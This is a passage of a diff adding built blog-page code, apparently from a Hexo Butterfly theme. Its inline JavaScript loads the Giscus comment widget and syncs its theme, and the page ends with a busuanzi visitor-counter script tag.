+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
